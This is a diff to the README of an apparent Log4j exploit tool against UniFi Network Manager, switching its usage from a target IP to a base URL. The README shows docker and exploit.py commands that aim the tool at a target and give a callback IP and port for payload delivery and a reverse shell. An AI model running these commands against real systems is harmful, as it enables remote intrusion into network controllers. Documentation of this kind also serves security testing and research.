@@ -47,18 +47,18 @@ To run the container, run a command similar to the following with your command l
 
 ```
 docker run -it -v $(pwd)/loot:/Log4jUnifi/loot -p 8090:8090 -p 1389:1389 Log4jUnifi \ 
-    -t 10.100.100.1 -i 192.168.1.1 -p 4444
+    -u https://unifi.acme.com:8443 -i 192.168.1.1 -p 4444
 ```
 
 
 # Usage
 
 ```
-usage: exploit.py [-h] -t IP -i CALLBACK [-p PORT] [-e] [-r]
+usage: exploit.py [-h] -u URL -i CALLBACK -p PORT
 
 optional arguments:
   -h, --help            show this help message and exit
-  -t IP, --target IP    vCenter Host IP
+  -u URL, --url URL     Unifi Network Manager base URL
   -i CALLBACK, --ip CALLBACK
                         Callback IP for payload delivery and reverse shell.
   -p PORT, --port PORT  Callback port for reverse shell.
@@ -69,7 +69,7 @@ optional arguments:
 Get a reverse shell using the tool installed on your local system:
 
 ```
-python3 exploit.py -t unifi.acme.com -i 10.10.10.1 -p 4444
+python3 exploit.py -u https://unifi.acme.com:8443 -i 10.10.10.1 -p 4444
 ```
 
 # Disclaimer
